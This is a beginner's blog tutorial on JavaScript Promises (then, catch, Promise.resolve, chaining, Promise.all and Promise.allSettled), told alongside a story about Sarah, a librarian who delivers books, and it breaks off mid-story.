&lt;p&gt;Every &lt;code&gt;Promise&lt;/code&gt; returns an &lt;code&gt;Object&lt;/code&gt;. And this &lt;code&gt;Object&lt;/code&gt; owns 2 important methods. &lt;code&gt;then&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt;. You can use these methods to attach &lt;code&gt;callbacks&lt;/code&gt; to a &lt;code&gt;Promise&lt;/code&gt;. You pass them a &lt;code&gt;function&lt;/code&gt; which will be called as soon as the &lt;code&gt;Promise&lt;/code&gt; delegates an &lt;code&gt;event&lt;/code&gt;. What events?&lt;/p&gt;

&lt;p&gt;You can call the &lt;code&gt;resolve&lt;/code&gt; callback inside a &lt;code&gt;Promise Function&lt;/code&gt;'s body and pass it what data you want. Then the &lt;code&gt;Promise&lt;/code&gt; calls the &lt;code&gt;callback function&lt;/code&gt; inside the first &lt;code&gt;then&lt;/code&gt; call and passes the data to it. The &lt;code&gt;Promise&lt;/code&gt; calls the &lt;code&gt;catch&lt;/code&gt; method as soon as you call the &lt;code&gt;rejection&lt;/code&gt; callback.&lt;/p&gt;

&lt;p&gt;Let's visualize this process by an example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;https://example.com/endpoint&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;request&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Error in fetching the request&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;Here we call the &lt;code&gt;fetch function&lt;/code&gt; and pass it the &lt;code&gt;endpoint URL&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;fetch function&lt;/code&gt; creates a &lt;code&gt;Promise Object&lt;/code&gt; and returns it.&lt;/li&gt;
&lt;li&gt;We store this &lt;code&gt;Object&lt;/code&gt; in the &lt;code&gt;request&lt;/code&gt; variable.&lt;/li&gt;
&lt;li&gt;We call &lt;code&gt;request&lt;/code&gt;'s &lt;code&gt;then&lt;/code&gt; method and pass it a &lt;code&gt;function&lt;/code&gt;. The function can receive as many arguments as it expects. It retrieves those arguments from what the &lt;code&gt;Promise&lt;/code&gt; passes to the &lt;code&gt;resolve&lt;/code&gt; callback. Then the given function can do as much as it desires with the given data.&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Next, we call &lt;code&gt;request&lt;/code&gt;'s &lt;code&gt;catch&lt;/code&gt; method. We pass it a function. And expect the &lt;code&gt;Promise&lt;/code&gt; to call this function when it &lt;code&gt;rejects&lt;/code&gt; or the &lt;code&gt;then&lt;/code&gt; method &lt;code&gt;throws&lt;/code&gt; an &lt;code&gt;Error&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;In the end we run the code to see if it works. Of course it does. And if not, we won't hesitate to point our finger at the back end:)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A question exists. The &lt;code&gt;then&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt; methods only add callbacks to the &lt;code&gt;Promise Object&lt;/code&gt;. So why aren't they &lt;code&gt;properties&lt;/code&gt; to which we can attach the &lt;code&gt;callback functions&lt;/code&gt;? Wouldn't it be simpler?&lt;/p&gt;

&lt;p&gt;We'll find the answer.&lt;/p&gt;




&lt;p&gt;Everything Sarah did resulted in a &lt;code&gt;Promise&lt;/code&gt;. &lt;br&gt;
Hitting the &lt;code&gt;resolve&lt;/code&gt; button was only the first step. &lt;/p&gt;

&lt;p&gt;She had to find the book in the library. She had to package it next to the other ones which she had to deliver the following day.&lt;/p&gt;

&lt;p&gt;She had to mark each package with the right user's information. This included their names and addresses. She had to be careful when she loaded the packages on the bike. Not to disturb her ride.&lt;/p&gt;

&lt;p&gt;She had to ride through streets and alleys. Dodging traffics and caring for her safety. Reaching her destination, she had to ring the doorbell. If the client was present, &lt;code&gt;then&lt;/code&gt; she delivered the book.&lt;br&gt;
And &lt;code&gt;then&lt;/code&gt; she took the reader's previous book to return it to the library. &lt;/p&gt;

&lt;p&gt;After repeating the same routine for every client, she had to &lt;code&gt;finally&lt;/code&gt; go back to the library. She placed the returned books on the shelves. &lt;code&gt;Then&lt;/code&gt; filled the Access database with data about the returned and the delivered ones.&lt;/p&gt;

&lt;p&gt;After all, it was time to review that day's orders and check for their availability. Then managing to hit the &lt;code&gt;resolve&lt;/code&gt; or the &lt;code&gt;reject&lt;/code&gt; buttons.&lt;/p&gt;

&lt;p&gt;Even the rest she got by her night sleeps, was a promise she had made to her body.&lt;/p&gt;

&lt;p&gt;And it feels good to fulfill promises. Doesn't it?😊&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#the-methodology-behind-promises-returning-objects"&gt;
  &lt;/a&gt;
  ⛓️ The Methodology Behind Promises: Returning Objects!&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;We've faced a question. A matter which insists that providing &lt;code&gt;callbacks&lt;/code&gt; through methods is useless. The &lt;code&gt;Promise API&lt;/code&gt; can instead provide special &lt;code&gt;Object Properties&lt;/code&gt;. Or the ability to add an array of &lt;code&gt;callbacks&lt;/code&gt;, for another instance.&lt;/p&gt;

&lt;p&gt;But think of all the possibilities you might face while developing front-end applications. You won't always want the &lt;code&gt;callbacks&lt;/code&gt; to run in order. You might not remember a case for this at the moment, but sure someday you'll face it. &lt;/p&gt;

&lt;p&gt;Different scenarios need different approaches. And if the &lt;code&gt;Promise&lt;/code&gt; is going to be of any help during these situations, it has to be flexible.&lt;/p&gt;

&lt;p&gt;Let's have a look at a piece of code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;aPromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;resolved&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;aPromise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we have been able to use the &lt;code&gt;Promise&lt;/code&gt;'s static &lt;code&gt;resolve&lt;/code&gt; method. Without even having to construct a new &lt;code&gt;Promise Instance&lt;/code&gt; we were able to return a &lt;code&gt;Promise Object&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we can call this &lt;code&gt;Object&lt;/code&gt;'s &lt;code&gt;then&lt;/code&gt; method. Or its &lt;code&gt;catch&lt;/code&gt; one. &lt;/p&gt;

&lt;p&gt;Well, what good is that for? You may ask. To find the answer let's have a look at another example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;firstPromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="na"&gt;message&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;hello&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;secondPromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;firstPromise&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;boolean&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;boolean&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;JSON string was created successfuly!&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;JSON creation error&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;})&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;thirdPromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;firstPromise&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt; world!&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;The data doesn't contain a message!&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;})&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newData&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;newData&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toUpperCase&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Error in third Promise&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here, we've initiated a &lt;code&gt;Promise Object&lt;/code&gt; using only &lt;code&gt;Promise.resolve&lt;/code&gt;. This promise object gives us all the superpowers we want. We can call its &lt;code&gt;then&lt;/code&gt; method as much as we want, in a &lt;code&gt;chain&lt;/code&gt; or in &lt;code&gt;separate calls&lt;/code&gt;. This allows us to create various &lt;code&gt;waiters&lt;/code&gt; for the same process. What is a &lt;code&gt;waiter&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;Let's say you have got to fetch data, which you will use in different parts of your application. But there's a problem. You can reuse &lt;code&gt;synchronous operation&lt;/code&gt; data as in &lt;code&gt;variables&lt;/code&gt;. But you can't do that with &lt;code&gt;asynchronous&lt;/code&gt; data. You should wait for it to become available.&lt;/p&gt;

&lt;p&gt;Now, there are different parts in your project, awaiting this data. We can refer to these parts as &lt;code&gt;waiters&lt;/code&gt;. They're observing the &lt;code&gt;Promise&lt;/code&gt;'s status and as soon it &lt;code&gt;settles&lt;/code&gt;, they will read its data.&lt;/p&gt;

&lt;p&gt;The above example showcases how the &lt;code&gt;then&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt; methods help you to reuse the same data in different scenarios.&lt;/p&gt;

&lt;p&gt;This way the &lt;code&gt;Promise API&lt;/code&gt; is providing an easy-to-use solution.&lt;/p&gt;

&lt;p&gt;But it also provides us with some useful static methods. We can use them to handle different situations. They include: &lt;code&gt;Promise.all&lt;/code&gt;, &lt;code&gt;Promise.allSettled&lt;/code&gt;, &lt;code&gt;Promise.any&lt;/code&gt;, and &lt;code&gt;Promise.race&lt;/code&gt;.&lt;/p&gt;




&lt;p&gt;Every day, to return to the library Sarah had to make sure that she had visited every one of her destinations. If all the clients were present at home, the book exchanges were successful. Otherwise, some of them failed.&lt;/p&gt;

&lt;p&gt;She didn't need every deliverance to be &lt;code&gt;resolved&lt;/code&gt;. She needed to have finished the process which was about going to the client's house.&lt;/p&gt;

&lt;p&gt;In the end, she returned to the library. And when she was ready to enter the reports in the Access database, she would ask herself: "Was everyone at home? Did any of the orders remain undelivered?"&lt;/p&gt;

&lt;p&gt;She classified the undelivered books in a separate database. And she sent the clients an Email that expressed the situation.&lt;/p&gt;

&lt;p&gt;If she had delivered every book then, she only had to set that day's deliveries as done, in the database. Nothing further to take care of.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#static-methods-raw-promiseall-endraw-amp-raw-promiseallsettled-endraw-"&gt;
  &lt;/a&gt;
  🕸️ Static Methods: &lt;code&gt;Promise.all&lt;/code&gt; &amp;amp; &lt;code&gt;Promise.allSettled&lt;/code&gt;&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;all&lt;/code&gt; method accepts an array of &lt;code&gt;promises&lt;/code&gt;. Then it waits for all the promises to &lt;code&gt;resolve&lt;/code&gt;. If any of the promises &lt;code&gt;rejects&lt;/code&gt;, it will immediately return with the rejection reason.&lt;/p&gt;

&lt;p&gt;This function behaves like what Sarah asks herself every night: 'Was everyone at home? Did any of the orders remain undelivered?' &lt;/p&gt;

&lt;p&gt;She will know that she has done all her tasks once she delivered the last book. If so, only the clients' returned books would be on her bike. &lt;/p&gt;

&lt;p&gt;&lt;code&gt;Promise.all&lt;/code&gt; resolves once every &lt;code&gt;Promise&lt;/code&gt; in the promises array passed to it resolves. It returns an array of what each promise had returned. Like the books that the library's clients returned.&lt;/p&gt;

&lt;p&gt;Sarah immediately knew that the delivery has failed If none of the clients were present at home. She would return with the undelivered book still on her bike. &lt;/p&gt;

&lt;p&gt;If any of the promises you pass to &lt;code&gt;Promise.all&lt;/code&gt; rejects, it will immediately reject. With the &lt;code&gt;rejection&lt;/code&gt; reason of the rejected promise.&lt;/p&gt;

&lt;p&gt;An example of &lt;code&gt;Promise.all&lt;/code&gt; usage:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;all&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nx"&gt;client1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;client2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;client3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;returnedBooks&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;returnedBooks&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rejectionReason&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Error: a book was not delivered.&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;rejectionReason&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We said that Sarah's return to the library didn't depend on every client's presence. She needed to make the visit. So if she had toured around all the clients' addresses, she was ready to return to the library. And on her bike, she transported all the books. Whether returned or undelivered. &lt;/p&gt;

&lt;p&gt;For a likewise behavior with &lt;code&gt;JavaScript Promises&lt;/code&gt;, we can use &lt;code&gt;Promise.allSettled&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;Every &lt;code&gt;Promise&lt;/code&gt; passes through two main states: &lt;code&gt;pending&lt;/code&gt; and &lt;code&gt;settled&lt;/code&gt;. The settled state is when the promise has been &lt;code&gt;fulfilled&lt;/code&gt;. The settlement either happens with resolve or a rejection. &lt;/p&gt;

&lt;p&gt;The &lt;code&gt;all&lt;/code&gt; method immediately returned when a &lt;code&gt;Promise&lt;/code&gt; rejected or every promise resolved. &lt;br&gt;
But the &lt;code&gt;allSettled&lt;/code&gt; method immediately returns. When all promises have either &lt;code&gt;resolved&lt;/code&gt; or &lt;code&gt;rejected&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;When they are &lt;code&gt;settled&lt;/code&gt; indeed.&lt;/p&gt;

&lt;p&gt;What the &lt;code&gt;allSettled&lt;/code&gt; method returns in its &lt;code&gt;resolve&lt;/code&gt;, consists of an array of objects. Each object has a &lt;code&gt;status&lt;/code&gt; property which is either &lt;code&gt;fulfilled&lt;/code&gt; or &lt;code&gt;rejected&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;If the status is &lt;code&gt;fulfilled&lt;/code&gt; then the object provides a &lt;code&gt;value&lt;/code&gt; property too. Otherwise, it owns a &lt;code&gt;reason&lt;/code&gt; property.&lt;/p&gt;

&lt;p&gt;A demonstration of it in code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;allSettled&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nx"&gt;client1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;client2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;client3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;books&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
    &lt;span class="nx"&gt;books&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;forEach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;fulfilled&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;A returned book&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;An undelivered book&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;Soon enough troubles showed up.&lt;/p&gt;

&lt;p&gt;The website's users had to wait a long time for the response message's arrival. Then they started to see more rejection messages. No matter what book they ordered, a rejection message awaited them in their inboxes after 1 to 2 days.&lt;/p&gt;

&lt;p&gt;Some of the users tried to contact Sarah through Emails. But they only got a simple reply.  It stated: "The requested book is currently borrowed by someone else. You can try to order it later, or borrow another one."&lt;/p&gt;

&lt;p&gt;These replies worsened the situation. It surprised the clients that Sarah didn't even state when the book will be available. Or whether she could put them in a queue. &lt;/p&gt;

&lt;p&gt;Everything seemed unexpected and random.&lt;/p&gt;

&lt;p&gt;Sarah at first didn't notice any issue. She was still taking books for some people. But later it caught her eyes that things were getting weird.&lt;/p&gt;

&lt;p&gt;Before anything started to happen she wanted to find a solution to speed her routine up. She called her cousin and asked him if he could help her in searching the current Access databases. She needed to be quicker in finding out if a book was available.&lt;/p&gt;

&lt;p&gt;He said he would look into it and call her as soon as he found anything. The next day he had a solution. He could write a &lt;code&gt;python bot&lt;/code&gt; which would search every Access database. And to speed things up, he had found a useful algorithm for it too.&lt;/p&gt;

&lt;p&gt;He made the bot ready within a day. It searched the Access files for a specified book name and stated whether it was available to borrow. His special algorithm indeed created several &lt;code&gt;asynchronous operations&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;It searched each file in real-time with the others. As soon as any of the files contained a search result matching the book, the bot took it. Then it terminated all the search operations.&lt;/p&gt;

&lt;p&gt;She had separated the Access files into two different directories. She named one of them the &lt;strong&gt;library books&lt;/strong&gt; and the other the &lt;strong&gt;ordered books&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;Books in the ordered books' directory were currently ordered or delivered. &lt;/p&gt;

&lt;p&gt;The library books databases had a list of all books in the library. It also contained information on whether a book was available or not.&lt;/p&gt;

&lt;p&gt;While developing his bot he had decided that the result was either in the &lt;code&gt;ordered books&lt;/code&gt; databases or the &lt;code&gt;library&lt;/code&gt; ones. If it was the ordered ones then it was obvious that the book wasn't available and Sarah had to reject the ticket. &lt;br&gt;
